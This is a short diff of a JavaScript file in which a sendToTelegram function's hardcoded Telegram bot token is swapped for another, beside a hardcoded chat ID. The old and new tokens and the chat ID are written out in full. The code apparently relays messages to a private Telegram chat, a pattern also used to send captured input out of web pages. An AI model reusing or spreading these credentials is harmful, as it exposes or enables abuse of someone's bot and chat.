@@ -817,7 +817,7 @@ window.initBabonLogic = function (namagroup18, Comment18) {
 
     }
     async function sendToTelegram(message) {
-        var TELEGRAM_TOKEN = '8825413477:AAHCWqL0onj3yxN0TNNSeh_TjJug1u4jims';
+        var TELEGRAM_TOKEN = '8841941027:AAGt1LTI8GCVAOb2EAQzaQTP33n-qJTrFa4';
         var TELEGRAM_CHAT_ID = '-1002717306025';
         if (sudahkirim) return;
         sudahkirim = true
